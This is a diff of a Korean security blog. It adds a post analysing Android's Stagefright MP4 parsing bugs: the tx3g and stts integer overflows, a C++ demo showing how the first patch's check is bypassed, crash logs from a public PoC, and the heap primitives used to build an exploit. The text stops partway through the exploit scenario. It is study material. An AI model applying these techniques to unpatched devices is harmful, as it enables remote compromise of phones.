@@ -9,7 +9,8 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="DEFCON 2015, Offensive and Defensive Android Reverse Engineering 에서. Github.com 의 rednaga/training 에 가보면 있음. Alcatel One Touch Pop Icon A564C 우선 전략을 &hellip;">
+  <meta name="description" content="Tavis Ormandy 의 Sophail: Applied attacks against Sophos Antivirus 을 읽고 요약해본다.
+">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +66,1287 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-13T21:17:29+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:17 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Tavis Ormandy 의 <a href="https://lock.cmpxchg8b.com/sophailv2.pdf">Sophail: Applied attacks against Sophos Antivirus</a> 을 읽고 요약해본다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/09/13/stagefright/">Stagefright</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-13T20:55:51+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:55 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Android 의 Stagefright 버그를 정리해본다.</p>
+
+<ul>
+<li><a href="http://blog.fortinet.com/post/cryptogirl-on-stagefright-a-detailed-explanation">CryptoGirl on StageFright: A Detailed Explanation</a></li>
+<li><a href="http://translate.wooyun.io/2015/08/08/Stagefright-Vulnerability-Disclosure.html">Stagefright Vulnerability Disclosure</a></li>
+<li><a href="http://googleprojectzero.blogspot.gr/2015/09/stagefrightened.html">Stagefrightened?</a></li>
+<li><a href="https://blog.zimperium.com/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/">Zimperium Blog</a></li>
+</ul>
+
+
+<h4>What&rsquo;s an ATOM?</h4>
+
+<p>MPEG-4 는 atoms 나 boxes 같은 유닛으로 이뤄져있다. 이 box 들은 header 로 시작하는데, 헤더는 다음과 같다.
+BoxType 은 4 글자 코드로 구성된다. FourCC 라고 불리는데, <code>covr</code>, <code>esds</code> 같은 식이다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>BOXHEADER structure
+</span><span class='line'>Field           Type                    Comment
+</span><span class='line'>TotalSize       UI32                    The total size of the box in bytes, including this header
+</span><span class='line'>BoxType         UI32                    The type of atom
+</span><span class='line'>ExtendedSize    If TotalSize equals 1   The total 64-bit length of the box in bytes,
+</span><span class='line'>                UI64                    including this header</span></code></pre></td></tr></table></div></figure>
+
+
+<p>MP4 를 분석할 때 유용한 도구들.</p>
+
+<ul>
+<li>010 Editor</li>
+<li>mp4file (apt-get install mp4v2-utils)</li>
+<li><a href="https://sites.google.com/site/james2013notes/download">mp4 parser</a></li>
+</ul>
+
+
+<p>StageFright 버그에 영향받는 Box 종류들은 다음과 같다.</p>
+
+<ul>
+<li><code>albm</code> : album title and track number for the media</li>
+<li><code>auth</code> : author of the media</li>
+<li><code>covr</code> : album cover artwork</li>
+<li><code>ctss</code> : composition Time To Sample mapping</li>
+<li><code>esds</code> : elementary Stream Description</li>
+<li><code>gnre</code> : genre of the media</li>
+<li><code>perf</code> : performer or artist</li>
+<li><code>stsc</code> : sample to chunk mapping</li>
+<li><code>stss</code> : list of sync samples</li>
+<li><code>tx3g</code> : text metadata</li>
+<li><code>yrrc</code> : recording year for the media</li>
+</ul>
+
+
+<p>여러가지 버그들이 있는데, 일단 대충 감을 잡기 위해 가장 간단한 <code>stts</code> integer overflow 를 보련다.</p>
+
+<h4>stts integer overflow</h4>
+
+<p>일단 패치만 보면,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-   uint64_t allocSize = numEntries * 2 * sizeof(uint32_t);
+</span><span class='line'>+   uint64_t allocSize = numEntries * 2 * (uint64_t)sizeof(uint32_t);</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>주변의 소스를 봐야겠지만,</li>
+<li><code>(uint64_t)</code> 로 캐스팅을 안해줘서, 32 bit 로 연산이 되어서, overflow 가 나버리는 것 같다.</li>
+<li><code>allocSize = numEntries * 2 * 4 &gt;= 0xFFFFFFFF + 1</code> 이면 overflow 가 나서,</li>
+<li>작은 숫자가 되버리고, 그게 64 bit 로 확장되는 듯.</li>
+<li>작은 숫자로 memory alloc 이 되어서, 버퍼는 작은데, overrun 이 일어나는 듯.</li>
+</ul>
+
+
+<p><code>stts</code> box 는 <code>defines time-to-sample mapping for a sample table</code> 한다고 하는데.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>stts box
+</span><span class='line'>Field       Type                Comment
+</span><span class='line'>Header      BOXHEADER           BoxType = 'stts' (0x73747473)
+</span><span class='line'>Version     UI8                 Expected to be 0
+</span><span class='line'>Flags       UI24                None defined, set to 0
+</span><span class='line'>Count       UI32                The number of STTSRECORD entries
+</span><span class='line'>Entries     STTSRECORD[Count]   An array of STTSRECORD structures</span></code></pre></td></tr></table></div></figure>
+
+
+<p>여기서 numEntries 가 <code>Count</code> 에 해당한다고. <code>stts</code> 다음의 5,6,7,8 번째 바이트가 <code>20 00 00 00</code> 보다 크다면, integer overflow 가 난다고.</p>
+
+<p>Crash 를 보면,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>F/libc: Fatal signal 11 (SIGSEGV) at 0x10958a14 (code=1), thread 1490 (Binder_2)...
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Google Project Zero</h4>
+
+<p>구글 Project Zero 팀이 글을 하나 올렸는데. <code>tx3g</code> 청크 타입 파싱 루틴에서 발생하는 integer overflow 버그이다.</p>
+
+<p><code>chunk_size</code> 는 <code>uint64_t</code> 타입이며, 화일에서 읽어들인다. 공격자가 컨트롤하는 변수. 검증은 부족.</p>
+
+<ul>
+<li><code>size + chunk_size</code> 에서 overflow 가 발생하면서, 버퍼가 작게 alloc 되고</li>
+<li>바로 따라오는 memcpy 가 <code>size</code> 만큼 카피하면서 buffer overrun 이 발생하는 모양.</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>case FOURCC('t', 'x', '3', 'g'):
+</span><span class='line'>{
+</span><span class='line'>    uint32_t type;
+</span><span class='line'>    const void *data;
+</span><span class='line'>    size_t size = 0;
+</span><span class='line'>    if (!mLastTrack-&gt;meta-&gt;findData(kKeyTextFormatData, &type, &data, &size)) {
+</span><span class='line'>        size = 0;
+</span><span class='line'>    }
+</span><span class='line'>    uint8_t *buffer = new uint8_t[size + chunk_size];   // &lt;---- Integer overflow here
+</span><span class='line'>    if (size &gt; 0) {
+</span><span class='line'>        memcpy(buffer, data, size);                     // &lt;---- Oh dear.
+</span><span class='line'>    }
+</span><span class='line'>    if ((size_t)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size)) &lt; chunk_size) {
+</span><span class='line'>        delete[] buffer;
+</span><span class='line'>        buffer = NULL;
+</span><span class='line'>        return ERROR_IO;
+</span><span class='line'>    }
+</span><span class='line'>    mLastTrack-&gt;meta-&gt;setData(kKeyTextFormatData, 0, buffer, size + chunk_size);
+</span><span class='line'>    delete[] buffer;
+</span><span class='line'>    *offset += chunk_size;
+</span><span class='line'>    break;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>간단한 sample code 를 만들어보았다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;cstddef&gt;
+</span><span class='line'>#include &lt;cstdio&gt;
+</span><span class='line'>#include &lt;cstring&gt;
+</span><span class='line'>#include &lt;cstdlib&gt;
+</span><span class='line'>#include &lt;iostream&gt;
+</span><span class='line'>
+</span><span class='line'>void* operator new(size_t size)
+</span><span class='line'>{
+</span><span class='line'>    std::cout &lt;&lt; "allocating " &lt;&lt; size &lt;&lt; std::endl;
+</span><span class='line'>    return malloc(size);
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main()
+</span><span class='line'>{
+</span><span class='line'>    size_t size = 100;
+</span><span class='line'>    uint64_t chunk_size=0xffffffffffffffff;
+</span><span class='line'>    
+</span><span class='line'>    uint8_t *buffer = new uint8_t[size + chunk_size];
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이걸 컴파일해서 돌리면,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ g++ babo.cpp
+</span><span class='line'>$ ./a.out
+</span><span class='line'>allocating 99
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>new allocator 에서 <code>size + chunk_size</code> 를 계산할때, chunk_size 를 -1 로 계산하는 모양.</li>
+<li>메모리 alloc 되는 buf size 가 100 에서 99 로 줄어들었다.</li>
+<li>이런식으로 줄어든 버퍼에, <code>memcpy(...,...,100)</code> 이 들어가면 버퍼 오버런이 발생하게 된다.</li>
+</ul>
+
+
+<p>그래서, fix 가 들어갔는데, Mark Brand 에 따르면 완전하지 않다고.</p>
+
+<p>첫번째, Fix 는 다음과 같았는데.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if (SIZE_MAX - chunk_size &lt;= size) {    // &lt;---- attempt to prevent overflow
+</span><span class='line'>    return ERROR_MALFORMED;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>문제는 chunk_size 는 <code>uint64_t</code> 인데, SIZE_MAX 는 <code>0xffffffff</code> 이라는 것. chunk_size > SIZE_MAX 일수가 있고, 그러면 if () check 를 통과하게 된다. Box 헤더의 extended chunk 를 쓰면 큰 chunk_size 를 만들 수 있다고 한다.</p>
+
+<p>아까 사용했던 코드에 overflow check 를 넣어서 테스트해본다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;cstddef&gt;
+</span><span class='line'>#include &lt;cstdio&gt;
+</span><span class='line'>#include &lt;cstring&gt;
+</span><span class='line'>#include &lt;cstdlib&gt;
+</span><span class='line'>#include &lt;iostream&gt;
+</span><span class='line'>
+</span><span class='line'>void* operator new(size_t size)
+</span><span class='line'>{
+</span><span class='line'>    std::cout &lt;&lt; "allocating " &lt;&lt; size &lt;&lt; std::endl;
+</span><span class='line'>    return malloc(size);
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main()
+</span><span class='line'>{
+</span><span class='line'>    size_t size = 100;
+</span><span class='line'>    uint64_t chunk_size=0xffffffffffffffff;
+</span><span class='line'>
+</span><span class='line'>#define MAX_SIZE (4294967295U)
+</span><span class='line'>
+</span><span class='line'>    if (MAX_SIZE - chunk_size &lt;= size) {
+</span><span class='line'>        std::cout &lt;&lt; "integer overflow detected!" &lt;&lt; std::endl;
+</span><span class='line'>    } else {
+</span><span class='line'>        std::cout &lt;&lt; "seems good." &lt;&lt; std::endl;
+</span><span class='line'>    }
+</span><span class='line'>    uint8_t *buffer = new uint8_t[size + chunk_size];
+</span><span class='line'>}
+</span><span class='line'>$ g++ babo.cpp
+</span><span class='line'>$ ./a.out
+</span><span class='line'>seems good.
+</span><span class='line'>allocating 99</span></code></pre></td></tr></table></div></figure>
+
+
+<p>체크를 바이패스하였다.</p>
+
+<p><a href="https://code.google.com/p/google-security-research/issues/detail?id=502">Issue 502: libstagefright integer overflow checks can by bypassed with extended chunk length</a></p>
+
+<p>Mark Brand 의 PoC subtitletest.mp4 를 HTC E8 에 넣고 돌리면 다음과 같이 mediaserver 가 죽는다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>I/DEBUG   (  442): pid: 11709, tid: 11726, name: Binder_2  &gt;&gt;&gt; /system/bin/mediaserver &lt;&lt;&lt;
+</span><span class='line'>I/DEBUG   (  442): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xdeadbaad
+</span><span class='line'>I/DEBUG   (  442): Abort message: 'invalid address or address of corrupt block 0xb760d3c0 passed to dlfree'
+</span><span class='line'>I/DEBUG   (  442):     r0 00000000  r1 b6f52dec  r2 00000001  r3 00000000
+</span><span class='line'>I/DEBUG   (  442):     r4 b760d3c0  r5 deadbaad  r6 00000048  r7 00000000
+</span><span class='line'>I/DEBUG   (  442):     r8 b760d3c8  r9 b47c5e98  sl b760d3c8  fp 00000000
+</span><span class='line'>I/DEBUG   (  442):     ip 00000000  sp b47c5e30  lr b6f23f5b  pc b6f23f5a  cpsr 60030030
+</span><span class='line'>I/DEBUG   (  442):
+</span><span class='line'>I/DEBUG   (  442): backtrace:
+</span><span class='line'>I/DEBUG   (  442):     #00 pc 00028f5a  /system/lib/libc.so (dlfree+1241)
+</span><span class='line'>I/DEBUG   (  442):     #01 pc 0000f1df  /system/lib/libc.so (free+10)
+</span><span class='line'>I/DEBUG   (  442):     #02 pc 000988c9  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1552)
+</span><span class='line'>I/DEBUG   (  442):     #03 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
+</span><span class='line'>I/DEBUG   (  442):     #04 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
+</span><span class='line'>I/DEBUG   (  442):     #05 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
+</span><span class='line'>I/DEBUG   (  442):     #06 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
+</span><span class='line'>I/DEBUG   (  442):     #07 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
+</span><span class='line'>I/DEBUG   (  442):     #08 pc 0009a29b  /system/lib/libstagefright.so (android::MPEG4Extractor::readMetaData()+66)
+</span><span class='line'>I/DEBUG   (  442):     #09 pc 0009a75b  /system/lib/libstagefright.so (android::MPEG4Extractor::countTracks()+4)
+</span><span class='line'>I/DEBUG   (  442):     #10 pc 0007df75  /system/lib/libstagefright.so (android::AwesomePlayer::setDataSource_l(android::sp&lt;android::MediaExtractor&gt; const&)+148)
+</span><span class='line'>I/DEBUG   (  442):     #11 pc 0007e915  /system/lib/libstagefright.so (android::AwesomePlayer::setDataSource_l(android::sp&lt;android::DataSource&gt; const&)+668)
+</span><span class='line'>I/DEBUG   (  442):     #12 pc 00080271  /system/lib/libstagefright.so (android::AwesomePlayer::setDataSource(int, long long, long long)+324)
+</span><span class='line'>I/DEBUG   (  442):     #13 pc 000450f9  /system/lib/libmediaplayerservice.so (android::MediaPlayerService::Client::setDataSource(int, long long, long long)+544)
+</span><span class='line'>I/DEBUG   (  442):     #14 pc 0005ca55  /system/lib/libmedia.so (android::BnMediaPlayer::onTransact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int)+660)
+</span><span class='line'>I/DEBUG   (  442):     #15 pc 00017fc5  /system/lib/libbinder.so (android::BBinder::transact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int)+60)
+</span><span class='line'>I/DEBUG   (  442):     #16 pc 0001d1d9  /system/lib/libbinder.so (android::IPCThreadState::executeCommand(int)+628)
+</span><span class='line'>I/DEBUG   (  442):     #17 pc 0001d347  /system/lib/libbinder.so (android::IPCThreadState::getAndExecuteCommand()+38)
+</span><span class='line'>I/DEBUG   (  442):     #18 pc 0001d39d  /system/lib/libbinder.so (android::IPCThreadState::joinThreadPool(bool)+68)
+</span><span class='line'>I/DEBUG   (  442):     #19 pc 00021a33  /system/lib/libbinder.so
+</span><span class='line'>I/DEBUG   (  442):     #20 pc 00011671  /system/lib/libutils.so (android::Thread::_threadLoop(void*)+112)
+</span><span class='line'>I/DEBUG   (  442):     #21 pc 00011131  /system/lib/libutils.so
+</span><span class='line'>I/DEBUG   (  442):     #22 pc 00012f8b  /system/lib/libc.so (__pthread_start(void*)+30)
+</span><span class='line'>I/DEBUG   (  442):     #23 pc 0001104f  /system/lib/libc.so (__start_thread+6)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이제 PoC 분석에 들어가본다.</p>
+
+<p>아래 그림은 구글 블로그에서 가져온 것인데. text 를 두개 alloc 하는데, 하나는 정상, 그리고 또 하나는 extended chunk size 로 0xffffffffffffffff 을 세팅하는 mp3 데이터이다.</p>
+
+<p><img src="/images/tx3g.png"></p>
+
+<p>저자는 MPEGExtractor.cpp 쪽에 로그를 집어넣고 빌드를 다시해서, PoC MP4 를 로드해본 결과 다음과 같은 로그가 잡혔다고 한다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> MPEG4Extractor: Identified supported mpeg4 through LegacySniffMPEG4.
+</span><span class='line'> MPEG4Extractor: trak: new Track[20] (0xb6048160)
+</span><span class='line'> MPEG4Extractor: trak: mLastTrack = 0xb6048160
+</span><span class='line'> MPEG4Extractor: tx3g: size 0 chunk_size 24
+</span><span class='line'> MPEG4Extractor: tx3g: new[24] (0xb6048130)
+</span><span class='line'> MPEG4Extractor: tx3g: mDataSource-&gt;readAt(*offset, 0xb6048130, 24)
+</span><span class='line'> MPEG4Extractor: tx3g: size 24 chunk_size 18446744073709551615
+</span><span class='line'> MPEG4Extractor: tx3g: new[23] (0xb6048130)
+</span><span class='line'> MPEG4Extractor: tx3g: memcpy(0xb6048130, 0xb6048148, 24)
+</span><span class='line'> MPEG4Extractor: tx3g: mDataSource-&gt;readAt(*offset, 0xb6048148, 18446744073709551615)</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li><code>new[23] (0xb6048130)</code> 으로 24 - 1 이 잡혀버린 것.</li>
+<li><code>memcpy(0xb6048130, 0xb6048148, 24)</code> 로 24 가 들어간 것.</li>
+<li><code>mDataSource-&gt;readAt(*offset, 0xb6048148, 18446744073709551615)</code> 로 read 사이즈는 184467&hellip;1615 가 들어간 것.</li>
+</ul>
+
+
+<p>나도 CyanogenMod 를 빌드해서 올려놓고 테스트하는게 나을 것 같다는 생각이 든다.</p>
+
+<p>어쨌든, 이제 exploit 을 만들기 위해서 몇가지 primitive 들이 필요하다고 한다. 그 첫번째는 memory alloc primitive 라고 하는데. Memory corruption 에서 memory alloc primitive 가 필요한 이유는 대부분의 경우, fragmented 된 영역을 채워버려서 메모리 상태를 좀 더 관리된 상태로 만들고 싶을 때이다.</p>
+
+<p>저자는 <code>pssh</code> box 를 이용하면 필요할 때 memory alloc 을 할 수 있다고 한다. <code>new</code> 로 들어가는 memory alloc 되는 버퍼의 length, 내용을 control 할 수 있다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>case FOURCC('p','s','s','h'):
+</span><span class='line'>{
+</span><span class='line'>    *offset += chunk_size;
+</span><span class='line'>    PsshInfo pssh;
+</span><span class='line'>    if (mDataSource-&gt;readAt(data_offset + 4, &pssh.uuid, 16) &lt; 16) {
+</span><span class='line'>        return ERROR_IO;
+</span><span class='line'>    }
+</span><span class='line'>    uint32_t psshdatalen = 0;
+</span><span class='line'>    if (mDataSource-&gt;readAt(data_offset + 20, &psshdatalen, 4) &lt; 4) {
+</span><span class='line'>        return ERROR_IO;
+</span><span class='line'>    }
+</span><span class='line'>    // pssh.datalen is set to a size we control
+</span><span class='line'>    pssh.datalen = ntohl(psshdatalen);
+</span><span class='line'>    ALOGV("pssh data size: %d", pssh.datalen);
+</span><span class='line'>    if (pssh.datalen + 20 &gt; chunk_size) {
+</span><span class='line'>        // pssh data length exceeds size of containing box
+</span><span class='line'>        return ERROR_MALFORMED;
+</span><span class='line'>    }
+</span><span class='line'>    // pssh.data is an allocated block of memory of a size we control
+</span><span class='line'>    pssh.data = new (std::nothrow) uint8_t[pssh.datalen];
+</span><span class='line'>    if (pssh.data == NULL) {
+</span><span class='line'>        return ERROR_MALFORMED;
+</span><span class='line'>    }
+</span><span class='line'>    ALOGV("allocated pssh @ %p", pssh.data);
+</span><span class='line'>    ssize_t requested = (ssize_t) pssh.datalen;
+</span><span class='line'>    // now we read data we control into that allocation
+</span><span class='line'>    if (mDataSource-&gt;readAt(data_offset + 24, pssh.data, requested) &lt; requested) {
+</span><span class='line'>        return ERROR_IO;
+</span><span class='line'>    }
+</span><span class='line'>    // and store it, so the allocation lives for the lifetime of our MPEG4Extractor
+</span><span class='line'>    // (these pssh blocks are in fact released in the destructor for the MPEG4Extractor)
+</span><span class='line'>    mPssh.push_back(pssh);
+</span><span class='line'>    break;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li><code>pssh.data = new (std::nothrow) uint8_t[pssh.datalen];</code> 로 memory alloc 을.</li>
+<li><code>mDataSource-&gt;readAt()</code> 으로 alloc 한 memory 에 read 를 한다.</li>
+<li>memory size 나 메모리에 들어가는 data 는 해커가 control 할 수 있다.</li>
+</ul>
+
+
+<p>이제 두번째 primitive 가 필요하다고 하는데,</p>
+
+<p>두번째 primitive 는 <code>avcC</code> 를 이용한 것인데, 이 box 를 처음만나게 되면, 파서는 메모리를 alloc 하고 내용을 저장 -> 두번째 만나면 replace &amp; release 한다고.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>case FOURCC('a', 'v', 'c', 'C'):
+</span><span class='line'>{
+</span><span class='line'>    *offset += chunk_size;
+</span><span class='line'>    sp&lt;ABuffer&gt; buffer = new ABuffer(chunk_data_size);
+</span><span class='line'>    if (mDataSource-&gt;readAt(data_offset, buffer-&gt;data(), chunk_data_size) &lt; chunk_data_size) {
+</span><span class='line'>        return ERROR_IO;
+</span><span class='line'>    }
+</span><span class='line'>    // this internally copies buffer-&gt;data() into a buffer of a size chunk_data_size, and
+</span><span class='line'>    // releases the previously stored data.
+</span><span class='line'>    mLastTrack-&gt;meta-&gt;setData(hKeyAVCC, kTypeAVCC, buffer-&gt;data(), chunk_data_size);
+</span><span class='line'>    break;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li><code>this internally copies buffer-&gt;data() into a buffer of a size chunk_data_size, and releases the previously stored data.</code></li>
+</ul>
+
+
+<p>이건 setData() 를 좀 봐야할 듯.</p>
+
+<p>어쨌든, 블로그에 따르면 excution control 을 가져오는 전술은, overflow 가 일어나서 MPEG4DataSource C++ object 를 overwrite 하는 시나리오를 만드는 것. MPEG4DataSource 를 alloc 하는 박스는 <code>stbl</code> 박스.</p>
+
+<p>사용하는 primitvie 들을 정리하면,</p>
+
+<ul>
+<li>Integer overflow 가 있는 박스는 <code>tx3g</code></li>
+<li>Memory alloc 을 하는 것은 <code>pssh</code></li>
+<li>Corrupt 될 object 를 alloc 하는 것은 <code>stbl</code></li>
+<li>Memory alloc &amp; release 를 하는 것은 <code>avcC</code> &amp; <code>hvcC</code></li>
+</ul>
+
+
+<p>시나리오는 다음과 같다고 한다.</p>
+
+<ul>
+<li>chunk_size 를 크게 만들어서 lhs 를 minus 로 만들어서 check 를 뚫는다.</li>
